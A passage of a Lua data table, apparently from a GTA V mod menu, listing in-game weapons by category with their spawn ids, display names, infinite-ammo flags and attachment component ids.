                    {name = "Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        StunGun = {id = "weapon_stungun", name = "Stun Gun", bInfAmmo = false, mods = {}},
        Pistol50 = {
            id = "weapon_pistol50",
            name = "Pistol .50",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}}
            }
        },
        SNSPistol = {
            id = "weapon_snspistol",
            name = "SNS Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"}
                }
            }
        },
        SNSPistolMkII = {
            id = "weapon_snspistol_mk2",
            name = "SNS Pistol Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "Mounted Scope", id = "COMPONENT_AT_PI_RAIL_02"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH_03"}},
                BarrelAttachments = {
                    {name = "Compensator", id = "COMPONENT_AT_PI_COMP_02"},
                    {name = "Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        HeavyPistol = {
            id = "weapon_heavypistol",
            name = "Heavy Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_HEAVYPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        VintagePistol = {
            id = "weapon_vintagepistol",
            name = "Vintage Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_VINTAGEPISTOL_CLIP_02"}
                },
                BarrelAttachments = {{"Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        FlareGun = {id = "weapon_flaregun", name = "Flare Gun", bInfAmmo = false, mods = {}},
        MarksmanPistol = {id = "weapon_marksmanpistol", name = "Marksman Pistol", bInfAmmo = false, mods = {}},
        HeavyRevolver = {id = "weapon_revolver", name = "Heavy Revolver", bInfAmmo = false, mods = {}},
        HeavyRevolverMkII = {
            id = "weapon_revolver_mk2",
            name = "Heavy Revolver Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_01"},
                    {name = "Tracer Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_REVOLVER_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Compensator", id = "COMPONENT_AT_PI_COMP_03"}}
            }
        },
        DoubleActionRevolver = {
            id = "weapon_doubleaction",
            name = "Double Action Revolver",
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {id = "weapon_raypistol", name = "Up-n-Atomizer", bInfAmmo = false, mods = {}}
    },
    SMG = {
        MicroSMG = {
            id = "weapon_microsmg",
            name = "Micro SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_MICROSMG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_MICROSMG_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        SMG = {
            id = "weapon_smg",
            name = "SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_SMG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_SMG_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_SMG_CLIP_03"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO_02"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        SMGMkII = {
            id = "weapon_smg_mk2",
            name = "SMG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_SMG_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_SMG_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_SMG_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_SMG_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_SMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS_SMG"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_SB_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_SB_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                }
            }
        },
        AssaultSMG = {
            id = "weapon_assaultsmg",
            name = "Assault SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_ASSAULTSMG_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        CombatPDW = {
            id = "weapon_combatpdw",
            name = "Combat PDW",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_COMBATPDW_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_COMBATPDW_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_COMBATPDW_CLIP_03"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        MachinePistol = {
            id = "weapon_machinepistol",
            name = "Machine Pistol ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_MACHINEPISTOL_CLIP_03"}
                },
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        MiniSMG = {
            id = "weapon_minismg",
            name = "Mini SMG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_MINISMG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_MINISMG_CLIP_02"}
                }
            }
        },
        UnholyHellbringer = {id = "weapon_raycarbine", name = "Unholy Hellbringer", bInfAmmo = false, mods = {}}
    },
    Shotguns = {
        PumpShotgun = {
            id = "weapon_pumpshotgun",
            name = "Pump Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{"name = Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_SR_SUPP"}}
            }
        },
        PumpShotgunMkII = {
            id = "weapon_pumpshotgun_mk2",
            name = "Pump Shotgun Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},
                    {name = "Dragon Breath Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},
                    {name = "Steel Buckshot Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},
                    {name = "Flechette Shells", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},
                    {name = "Explosive Slugs", id = "COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_SR_SUPP_03"},
                    {name = "Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"}
                }
            }
        },
        SawedOffShotgun = {id = "weapon_sawnoffshotgun", name = "Sawed-Off Shotgun", bInfAmmo = false, mods = {}},
        AssaultShotgun = {
            id = "weapon_assaultshotgun",
            name = "Assault Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_ASSAULTSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupShotgun = {
            id = "weapon_bullpupshotgun",
            name = "Bullpup Shotgun",
            bInfAmmo = false,
            mods = {
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        Musket = {id = "weapon_musket", name = "Musket", bInfAmmo = false, mods = {}},
        HeavyShotgun = {
            id = "weapon_heavyshotgun",
            name = "Heavy Shotgun",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_HEAVYSHOTGUN_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        DoubleBarrelShotgun = {id = "weapon_dbshotgun", name = "Double Barrel Shotgun", bInfAmmo = false, mods = {}},
        SweeperShotgun = {id = "weapon_autoshotgun", name = "Sweeper Shotgun", bInfAmmo = false, mods = {}}
    },
    AssaultRifles = {
        AssaultRifle = {
            id = "weapon_assaultrifle",
            name = "Assault Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_ASSAULTRIFLE_CLIP_03"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MACRO"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        AssaultRifleMkII = {
            id = "weapon_assaultrifle_mk2",
            name = "Assault Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_AR_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_AR_BARREL_0"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        CarbineRifle = {
            id = "weapon_carbinerifle",
            name = "Carbine Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_02"},
                    {name = "Box Magazine", id = "COMPONENT_CARBINERIFLE_CLIP_03"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CarbineRifleMkII = {
            id = "weapon_carbinerifle_mk2",
            name = "Carbine Rifle Mk II ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_CR_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_CR_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        AdvancedRifle = {
            id = "weapon_advancedrifle",
            name = "Advanced Rifle ",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_ADVANCEDRIFLE_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"}}
            }
        },
        SpecialCarbine = {
            id = "weapon_specialcarbine",
            name = "Special Carbine",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_SPECIALCARBINE_CLIP_03"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        SpecialCarbineMkII = {
            id = "weapon_specialcarbine_mk2",
            name = "Special Carbine Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_SC_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_SC_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        BullpupRifle = {
            id = "weapon_bullpuprifle",
            name = "Bullpup Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        BullpupRifleMkII = {
            id = "weapon_bullpuprifle_mk2",
            name = "Bullpup Rifle Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},
                    {name = "Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_AR_FLSH"}},
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_BP_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_BP_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Suppressor", id = "COMPONENT_AT_AR_SUPP"},
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CompactRifle = {
            id = "weapon_compactrifle",
            name = "Compact Rifle",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"},
                    {name = "Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"}
                }
            }
        }
    },
    LMG = {
        MG = {
            id = "weapon_mg",
            name = "MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_MG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_MG_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"}}
            }
        },
        CombatMG = {
            id = "weapon_combatmg",
            name = "Combat MG",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"}
                },
                Sights = {{name = "Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"}},
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP"}}
            }
        },
        CombatMGMkII = {
            id = "weapon_combatmg_mk2",
            name = "Combat MG Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},
                    {name = "FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"}
                },
                Sights = {
                    {name = "Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"},
                    {name = "Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"},
                    {name = "Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"}
                },
                Barrel = {
                    {name = "Default", id = "COMPONENT_AT_MG_BARREL_01"},
                    {name = "Heavy", id = "COMPONENT_AT_MG_BARREL_02"}
                },
                BarrelAttachments = {
                    {name = "Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"},
                    {name = "Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"},
                    {name = "Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"},
                    {name = "Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"},
                    {name = "Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"},
                    {name = "Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"},
                    {name = "Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"}
                },
                Grips = {{name = "Grip", id = "COMPONENT_AT_AR_AFGRIP_02"}}
            }
        },
        GusenbergSweeper = {
            id = "weapon_gusenberg",
            name = "GusenbergSweeper",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"}
                }
            }
        }
    },
    Snipers = {
        SniperRifle = {
            id = "weapon_sniperrifle",
            name = "Sniper Rifle",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = "Scope", id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                },
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_AR_SUPP_02"}}
            }
        },
        HeavySniper = {
            id = "weapon_heavysniper",
            name = "Heavy Sniper",
            bInfAmmo = false,
            mods = {
                Sights = {
                    {name = "Scope", id = "COMPONENT_AT_SCOPE_LARGE"},
                    {name = "Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"}
                }
            }
        },
        HeavySniperMkII = {
